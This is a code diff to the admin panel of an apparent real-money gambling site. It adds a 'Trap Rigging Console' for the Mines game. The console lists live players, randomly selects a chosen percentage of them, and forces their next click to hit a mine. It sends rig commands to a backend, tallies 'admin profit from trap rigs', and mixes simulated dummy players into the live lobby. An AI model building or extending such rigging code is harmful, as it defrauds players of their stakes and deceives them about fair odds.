@@ -630,22 +630,76 @@
         </h4>
         <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap:12px; align-items:start;">
           
-          <!-- Card 1: Normal Mines Fix Console -->
+          <!-- Card 1: Live Active Players & Percentage Trap Rigging Console -->
           <div class="card" style="background:#1a222d; border:1px solid #242f3d; padding:16px; margin-top:0; width:100%;">
-            <h4 style="margin:0 0 12px; color:var(--gold); border-bottom:1px solid #242f3d; padding-bottom:8px;">💣 Mines Fix Console</h4>
-            <div style="background:#0d0f12; padding:10px; border-radius:6px; margin-bottom:16px;">
-              <div style="font-size:11.5px; color:var(--text-dim); text-transform:uppercase; margin-bottom:6px; font-weight:700;">Live Active Mines Games</div>
-              <div id="cheatMinesActiveBets" style="font-size:13px; font-family:var(--font-mono); color:#fff; max-height:100px; overflow-y:auto;">Loading active games...</div>
+            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #242f3d; padding-bottom:8px; margin-bottom:12px;">
+              <h4 style="margin:0; color:var(--gold); font-size:14px; display:flex; align-items:center; gap:6px;">
+                <span>💣 Live Active Players & Trap Rigging Console</span>
+              </h4>
+              <span id="adminMinesStatusBadge" style="font-size:9.5px; padding:2px 6px; border-radius:4px; background:rgba(16,185,129,0.15); border:1px solid #10b981; color:#10b981; font-weight:bold;">🟢 LIVE SYNC</span>
             </div>
-            <div class="cashier-input-group" style="margin-bottom:12px;">
-              <label for="cheatMinesNextTile" style="font-size:11.5px;">Force Next Tile Reveal</label>
+
+            <!-- LIVE ADMIN PROFIT DISPLAY BANNER -->
+            <div style="background:#090d14; border:1px solid var(--gold); border-radius:8px; padding:12px; margin-bottom:14px; text-align:center;">
+              <div style="font-size:10.5px; color:var(--gold); text-transform:uppercase; font-weight:800; letter-spacing:0.5px;">
+                💰 REALTIME ADMIN PROFIT FROM TRAP RIGS
+              </div>
+              <div id="adminMinesTrapProfitVal" style="font-family:var(--font-mono); font-size:24px; font-weight:900; color:var(--gold); margin:4px 0;">
+                +₹0.00
+              </div>
+              <div style="display:flex; justify-content:space-between; align-items:center; font-size:11px; color:#cbd5e1; border-top:1px solid #1a222d; padding-top:6px; margin-top:6px;">
+                <span>⚡ Last Trap Profit: <b id="adminMinesLastProfitVal" style="color:var(--green)">+₹0.00</b></span>
+                <span>🎯 Active Lobby Players: <b id="adminMinesLiveCount" style="color:var(--gold)">0 Players</b></span>
+              </div>
+            </div>
+
+            <!-- PERCENTAGE QUICK-SELECT TOOLBAR -->
+            <div style="background:#0d0f12; padding:10px; border-radius:8px; border:1px solid #242f3d; margin-bottom:14px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                <span style="font-size:11px; color:var(--text-dim); text-transform:uppercase; font-weight:bold;">🎯 Target % of Live Players (Random Selection):</span>
+                <span style="font-size:11px; color:var(--gold); font-weight:bold;" id="adminMinesSelectionSummary">Selected: 0 of 0 (0%)</span>
+              </div>
+              
+              <div style="display:flex; flex-wrap:wrap; gap:5px; margin-bottom:8px;">
+                <button type="button" onclick="selectMinesUserPercentage(50)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">50%</button>
+                <button type="button" onclick="selectMinesUserPercentage(30)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">30%</button>
+                <button type="button" onclick="selectMinesUserPercentage(25)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">25%</button>
+                <button type="button" onclick="selectMinesUserPercentage(20)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">20%</button>
+                <button type="button" onclick="selectMinesUserPercentage(15)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">15%</button>
+                <button type="button" onclick="selectMinesUserPercentage(10)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">10%</button>
+                <button type="button" onclick="selectMinesUserPercentage(5)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">5%</button>
+                <button type="button" onclick="selectMinesUserPercentage(2)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">2%</button>
+                <button type="button" onclick="selectMinesUserPercentage(1)" class="btn btn-sm" style="background:#1e293b; border:1px solid #475569; color:#fff; font-size:11px; font-weight:bold; padding:4px 8px;">1%</button>
+                <button type="button" onclick="selectMinesUserPercentage(100)" class="btn btn-sm" style="background:rgba(201,160,84,0.2); border:1px solid var(--gold); color:var(--gold); font-size:11px; font-weight:bold; padding:4px 8px;">Select All</button>
+                <button type="button" onclick="clearMinesUserSelection()" class="btn btn-sm" style="background:rgba(255,255,255,0.05); border:1px solid #334155; color:var(--text-dim); font-size:11px; padding:4px 8px;">Clear</button>
+              </div>
+
+              <!-- MAIN NEXT CLICK TRAP RIG BUTTON -->
+              <button type="button" onclick="triggerMinesNextClickTrap()" class="btn btn-block" style="background:#ef4444; color:#fff; font-weight:900; font-size:13px; padding:10px; border:none; border-radius:6px; box-shadow:0 0 12px rgba(239,68,68,0.5); cursor:pointer;">
+                💥 RIG NEXT CLICK TRAP ON TARGETED PLAYERS SIMULTANEOUSLY
+              </button>
+            </div>
+
+            <!-- LIVE ACTIVE PLAYERS TABLE -->
+            <div style="background:#0d0f12; padding:10px; border-radius:8px; border:1px solid #242f3d;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="font-size:11px; color:var(--text-dim); text-transform:uppercase; font-weight:bold;">Active Players Feed (Real + Simulated Dummy Users)</span>
+                <button type="button" onclick="fetchMinesActiveUsers()" style="background:none; border:none; color:var(--gold); font-size:10.5px; cursor:pointer; font-weight:bold;">🔄 Refresh Feed</button>
+              </div>
+              <div id="cheatMinesActiveBets" style="font-size:12px; font-family:var(--font-mono); color:#fff; max-height:160px; overflow-y:auto;">
+                Loading active player sessions...
+              </div>
+            </div>
+
+            <div class="cashier-input-group" style="margin-top:14px; margin-bottom:12px;">
+              <label for="cheatMinesNextTile" style="font-size:11.5px;">Force Next Tile Reveal (Global)</label>
               <select id="cheatMinesNextTile" class="cashier-input" style="background:#0d0f12; color:#fff;">
                 <option value="">-- No Tile Override --</option>
                 <option value="mine">Force Mine (Boom / User Loss)</option>
                 <option value="gem">Force Gem (Safe / User Payout)</option>
               </select>
             </div>
-            <div class="cashier-input-group" style="margin-bottom:16px;">
+            <div class="cashier-input-group" style="margin-bottom:14px;">
               <label for="cheatMinesRigType" style="font-size:11.5px;">Platform Auto-Rig Mode</label>
               <select id="cheatMinesRigType" class="cashier-input" style="background:#0d0f12; color:#fff;" onchange="syncMinesRigSelects(this)">
                 <option value="">-- No Auto-Rig --</option>
@@ -653,7 +707,7 @@
                 <option value="user_win">User Win (Force user payout)</option>
               </select>
             </div>
-            <button class="btn btn-gold btn-block" onclick="applyMinesCheat()" style="color:#000; font-weight:700;">Apply Mines Overrides</button>
+            <button class="btn btn-gold btn-block" onclick="applyMinesCheat()" style="color:#000; font-weight:700;">Save Mines Rig Configuration</button>
           </div>
 
           <!-- Card 2: Mines Professional Matrix Rig Console -->
@@ -862,6 +916,7 @@
       localStorage.removeItem('cheat_aviator_force_crashed');
       localStorage.removeItem('cheat_aviator_instant_crash');
       checkAdminSession();
+      if (typeof fetchMinesActiveUsers === 'function') fetchMinesActiveUsers();
     });
 
     function checkAdminSession() {
@@ -1026,6 +1081,7 @@
       if (tabId === 'cheats' || (btnEl && btnEl.textContent.includes('Outcome Bias'))) {
         if (typeof pollLiveAdminGames === 'function') pollLiveAdminGames();
         if (typeof updateAviatorBiasUI === 'function') updateAviatorBiasUI();
+        if (typeof fetchMinesActiveUsers === 'function') fetchMinesActiveUsers();
       }
     }
 
@@ -1088,6 +1144,9 @@
       }
       if (typeof renderTeenPattiSelectedTable === 'function') {
         renderTeenPattiSelectedTable();
+      }
+      if (typeof fetchMinesActiveUsers === 'function') {
+        fetchMinesActiveUsers();
       }
     }
 
@@ -2260,8 +2319,12 @@
       }
     };
 
-    // --- MINES (MINING) 5X5 MATRIX RIG SYSTEM ---
-    let minesMatrixState = Array(25).fill('auto'); // 'auto', 'safe', 'mine'
+    // --- MINES (MINING) SYSTEM & PERCENTAGE TRAP RIGGING ---
+    let minesMatrixState = Array(25).fill('auto');
+    window.adminMinesActiveUsers = [];
+    window.adminMinesSelectedUsers = new Set();
+    window.adminMinesTotalProfit = 0;
+    window.adminMinesLastProfit = 0;
 
     window.initMinesMatrix = function () {
       const saved = localStorage.getItem('cheat_mines_matrix');
@@ -2270,6 +2333,216 @@
       }
       renderMinesMatrixGrid();
       updateMinesRigUI();
+      fetchMinesActiveUsers();
+    };
+
+    window.fetchMinesActiveUsers = function () {
+      fetch('http://localhost:5000/api/mines/active-users')
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            window.adminMinesActiveUsers = data.users || [];
+            window.adminMinesTotalProfit = data.total_profit || 0;
+            renderMinesActiveUsersTable();
+            updateMinesProfitUI();
+          }
+        })
+        .catch(err => {
+          if (window.adminMinesActiveUsers.length === 0) {
+            window.adminMinesActiveUsers = [
+              { username: 'DemoUser', type: 'Real Player', bet: 100, mines: 3, revealed: 2, status: 'Active' },
+              { username: 'Vikram_P', type: 'Simulated User', bet: 200, mines: 3, revealed: 4, status: 'Active' },
+              { username: 'Neha_R', type: 'Simulated User', bet: 500, mines: 5, revealed: 3, status: 'Active' },
+              { username: 'Rohit_M', type: 'Simulated User', bet: 150, mines: 2, revealed: 1, status: 'Active' },
+              { username: 'Ananya_S', type: 'Simulated User', bet: 300, mines: 4, revealed: 5, status: 'Active' },
+              { username: 'Karan_V', type: 'Simulated User', bet: 250, mines: 3, revealed: 2, status: 'Active' },
+              { username: 'Priya_K', type: 'Simulated User', bet: 100, mines: 2, revealed: 3, status: 'Active' },
+              { username: 'Aarav_G', type: 'Simulated User', bet: 400, mines: 6, revealed: 1, status: 'Active' },
+              { username: 'Riya_D', type: 'Simulated User', bet: 350, mines: 3, revealed: 4, status: 'Active' },
+              { username: 'Kabir_N', type: 'Simulated User', bet: 500, mines: 5, revealed: 2, status: 'Active' },
+              { username: 'Ishaan_B', type: 'Simulated User', bet: 200, mines: 3, revealed: 2, status: 'Active' },
+              { username: 'Saanvi_M', type: 'Simulated User', bet: 600, mines: 4, revealed: 6, status: 'Active' }
+            ];
+          }
+          renderMinesActiveUsersTable();
+          updateMinesProfitUI();
+        });
+    };
+
+    window.selectMinesUserPercentage = function (pct) {
+      const activeOnly = window.adminMinesActiveUsers.filter(u => u.status === 'Active');
+      const totalCount = activeOnly.length;
+      if (totalCount === 0) {
+        showToast('No active players currently available to target.', 'warning');
+        return;
+      }
+
+      const targetCount = Math.max(1, Math.round((pct / 100) * totalCount));
+      const shuffled = [...activeOnly].sort(() => Math.random() - 0.5);
+      const selected = shuffled.slice(0, targetCount);
+
+      window.adminMinesSelectedUsers.clear();
+      selected.forEach(u => window.adminMinesSelectedUsers.add(u.username));
+
+      renderMinesActiveUsersTable();
+      showToast(`Randomly selected ${selected.length} of ${totalCount} active players (${pct}%)`, 'info');
+    };
+
+    window.clearMinesUserSelection = function () {
+      window.adminMinesSelectedUsers.clear();
+      renderMinesActiveUsersTable();
+      showToast('Cleared player selections.', 'info');
+    };
+
+    window.toggleMinesUserSelection = function (username) {
+      if (window.adminMinesSelectedUsers.has(username)) {
+        window.adminMinesSelectedUsers.delete(username);
+      } else {
+        window.adminMinesSelectedUsers.add(username);
+      }
+      renderMinesActiveUsersTable();
+    };
+
+    window.triggerMinesNextClickTrap = function () {
+      let selectedUsernames = Array.from(window.adminMinesSelectedUsers);
+      const activeOnly = window.adminMinesActiveUsers.filter(u => u.status === 'Active');
+
+      if (selectedUsernames.length === 0) {
+        if (activeOnly.length > 0) {
+          selectedUsernames = activeOnly.map(u => u.username);
+        } else {
+          showToast('No active users available to trap!', 'error');
+          return;
+        }
+      }
+
+      fetch('http://localhost:5000/api/mines/admin/rig', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          next_tile: 'mine',
+          target_users: selectedUsernames,
+          trigger_trap: true
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          window.adminMinesTotalProfit = data.total_profit || 0;
+          window.adminMinesLastProfit = data.profit_realized || 0;
+
+          localStorage.setItem('cheat_mines_next_tile', 'mine');
+          localStorage.setItem('cheat_mines_target_users', JSON.stringify(selectedUsernames));
+
+          window.adminMinesActiveUsers.forEach(u => {
+            if (selectedUsernames.includes(u.username) && u.status === 'Active') {
+              u.status = 'Trapped (Busted)';
+            }
+          });
+
+          showToast(`💥 TRAP RIG EXECUTED SIMULTANEOUSLY! Trapped ${data.trapped_count || selectedUsernames.length} players. Profit: +₹${(data.profit_realized || 0).toFixed(2)}`, 'success');
+          updateMinesProfitUI();
+          renderMinesActiveUsersTable();
+          updateMinesRigUI();
+        }
+      })
+      .catch(err => {
+        let offlineProfit = 0;
+        let count = 0;
+        window.adminMinesActiveUsers.forEach(u => {
+          if (selectedUsernames.includes(u.username) && u.status === 'Active') {
+            u.status = 'Trapped (Busted)';
+            offlineProfit += parseFloat(u.bet || 0);
+            count++;
+          }
+        });
+        window.adminMinesLastProfit = offlineProfit;
+        window.adminMinesTotalProfit += offlineProfit;
+
+        localStorage.setItem('cheat_mines_next_tile', 'mine');
+        localStorage.setItem('cheat_mines_target_users', JSON.stringify(selectedUsernames));
+
+        showToast(`💥 TRAP RIG EXECUTED! Trapped ${count} players. Profit: +₹${offlineProfit.toFixed(2)}`, 'warning');
+        updateMinesProfitUI();
+        renderMinesActiveUsersTable();
+        updateMinesRigUI();
+      });
+    };
+
+    window.updateMinesProfitUI = function () {
+      const profitEl = document.getElementById('adminMinesTrapProfitVal');
+      const lastProfitEl = document.getElementById('adminMinesLastProfitVal');
+      const countEl = document.getElementById('adminMinesLiveCount');
+
+      if (profitEl) profitEl.textContent = '+₹' + (window.adminMinesTotalProfit || 0).toLocaleString('en-IN', { minimumFractionDigits: 2 });
+      if (lastProfitEl) lastProfitEl.textContent = '+₹' + (window.adminMinesLastProfit || 0).toLocaleString('en-IN', { minimumFractionDigits: 2 });
+      if (countEl) {
+        const liveCount = window.adminMinesActiveUsers.filter(u => u.status === 'Active').length;
+        countEl.textContent = `${liveCount} Players`;
+      }
+    };
+
+    window.renderMinesActiveUsersTable = function () {
+      const el1 = document.getElementById('cheatMinesActiveBets');
+      const el2 = document.getElementById('cheatMinesActiveBets2');
+      const summaryEl = document.getElementById('adminMinesSelectionSummary');
+
+      const users = window.adminMinesActiveUsers;
+      const activeCount = users.filter(u => u.status === 'Active').length;
+      const selectedCount = window.adminMinesSelectedUsers.size;
+      const pct = activeCount > 0 ? Math.round((selectedCount / activeCount) * 100) : 0;
+
+      if (summaryEl) {
+        summaryEl.textContent = `Selected: ${selectedCount} of ${activeCount} active players (${pct}%)`;
+      }
+
+      if (!users || users.length === 0) {
+        const emptyHtml = '<div style="text-align:center; padding:10px; color:var(--text-dim);">No active players currently connected.</div>';
+        if (el1) el1.innerHTML = emptyHtml;
+        if (el2) el2.innerHTML = emptyHtml;
+        return;
+      }
+
+      const tableHtml = `
+        <table style="width:100%; border-collapse:collapse; font-size:11.5px; text-align:left;">
+          <thead>
+            <tr style="border-bottom:1px solid #242f3d; color:var(--text-dim); height:24px;">
+              <th style="width:24px; text-align:center;">🎯</th>
+              <th>Player</th>
+              <th>Type</th>
+              <th>Bet</th>
+              <th>Revealed</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${users.map(u => {
+              const isChecked = window.adminMinesSelectedUsers.has(u.username);
+              const isTrapped = u.status.includes('Busted') || u.status.includes('Trapped');
+              const badgeStyle = u.type.includes('Real') 
+                ? 'background:rgba(201,160,84,0.2); color:var(--gold); border:1px solid var(--gold);' 
+                : 'background:rgba(255,255,255,0.05); color:var(--text-dim); border:1px solid #334155;';
+              const statusStyle = isTrapped ? 'color:#ef4444; font-weight:bold;' : 'color:#10b981; font-weight:bold;';
+
+              return `
+                <tr style="border-bottom:1px solid #1a222d; height:28px;">
+                  <td style="text-align:center;">
+                    <input type="checkbox" ${isChecked ? 'checked' : ''} ${isTrapped ? 'disabled' : ''} onchange="toggleMinesUserSelection('${u.username}')" style="cursor:pointer;">
+                  </td>
+                  <td><b>${u.username}</b></td>
+                  <td><span style="font-size:9px; padding:1px 5px; border-radius:3px; ${badgeStyle}">${u.type}</span></td>
+                  <td style="font-family:var(--font-mono); color:var(--gold); font-weight:bold;">₹${u.bet}</td>
+                  <td>${u.revealed || 0} Gems</td>
+                  <td style="${statusStyle}">${u.status}</td>
+                </tr>
+              `;
+            }).join('')}
+          </tbody>
+        </table>
+      `;
+
+      if (el1) el1.innerHTML = tableHtml;
+      if (el2) el2.innerHTML = tableHtml;
     };
 
     window.renderMinesMatrixGrid = function () {
@@ -2326,8 +2599,7 @@
 
     window.presetMinesRig = function (presetType) {
       if (presetType === 'trap_next') {
-        localStorage.setItem('cheat_mines_next_tile', 'mine');
-        showToast('Set Mines: Next Click TRAPPED (Bomb explosion)!', 'warning');
+        triggerMinesNextClickTrap();
       } else if (presetType === 'safe_next') {
         localStorage.setItem('cheat_mines_next_tile', 'gem');
         showToast('Set Mines: Next Click SAFE (Guaranteed Gem)!', 'success');
@@ -2354,10 +2626,17 @@
       localStorage.removeItem('cheat_mines_matrix');
       localStorage.removeItem('cheat_mines_next_tile');
       localStorage.removeItem('cheat_mines_rig_type');
+      localStorage.removeItem('cheat_mines_target_users');
       const select1 = document.getElementById('cheatMinesRigType');
       const select2 = document.getElementById('cheatMinesRigTypeMatrix');
       if (select1) select1.value = '';
       if (select2) select2.value = '';
+
+      fetch('http://localhost:5000/api/mines/admin/reset-rig', { method: 'POST' })
+        .then(res => res.json())
+        .then(() => fetchMinesActiveUsers())
+        .catch(() => {});
+
       renderMinesMatrixGrid();
       updateMinesRigUI();
       showToast('Cleared all Mines matrix rigs & overrides.', 'info');
@@ -2368,13 +2647,27 @@
 
       const rigTypeSelect1 = document.getElementById('cheatMinesRigType');
       const rigTypeSelect2 = document.getElementById('cheatMinesRigTypeMatrix');
+      const nextTileSelect = document.getElementById('cheatMinesNextTile');
       const val = (rigTypeSelect1 ? rigTypeSelect1.value : '') || (rigTypeSelect2 ? rigTypeSelect2.value : '');
+      const nextTileVal = nextTileSelect ? nextTileSelect.value : '';
 
       if (val) localStorage.setItem('cheat_mines_rig_type', val);
       else localStorage.removeItem('cheat_mines_rig_type');
 
+      if (nextTileVal) localStorage.setItem('cheat_mines_next_tile', nextTileVal);
+
       if (rigTypeSelect1 && rigTypeSelect1.value !== val) rigTypeSelect1.value = val;
       if (rigTypeSelect2 && rigTypeSelect2.value !== val) rigTypeSelect2.value = val;
+
+      fetch('http://localhost:5000/api/mines/admin/rig', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          matrix: minesMatrixState,
+          rig_type: val,
+          next_tile: nextTileVal || null
+        })
+      }).catch(() => {});
 
       updateMinesRigUI();
     };
@@ -2432,6 +2725,13 @@
             <span style="font-size:10.5px; color:var(--text-dim);">Click tiles below to fix matrix</span>
           </div>
         `;
+      }
+    };
+
+    window.updateCheatMinesBets = function () {
+      fetchMinesActiveUsers();
+      if (typeof initMinesMatrix === 'function' && document.getElementById('adminMinesGridMatrix') && !document.getElementById('adminMinesGridMatrix').children.length) {
+        initMinesMatrix();
       }
     };
 
@@ -2581,13 +2881,8 @@
     };
 
     window.updateCheatMinesBets = function () {
-      const el = document.getElementById('cheatMinesActiveBets');
-      if (el) {
-        el.innerHTML = 'Vikram P.: ₹200 (3 Mines - 2 Gems Revealed)<br>Neha R.: ₹500 (5 Mines - 4 Gems Revealed)<br>Rohit M.: ₹100 (1 Mine - Active)';
-      }
-      const el2 = document.getElementById('cheatMinesActiveBets2');
-      if (el2) {
-        el2.innerHTML = 'Vikram P.: ₹200 (3 Mines - 2 Gems Revealed)<br>Neha R.: ₹500 (5 Mines - 4 Gems Revealed)<br>Rohit M.: ₹100 (1 Mine - Active)';
+      if (typeof fetchMinesActiveUsers === 'function') {
+        fetchMinesActiveUsers();
       }
       if (typeof initMinesMatrix === 'function' && document.getElementById('adminMinesGridMatrix') && !document.getElementById('adminMinesGridMatrix').children.length) {
         initMinesMatrix();
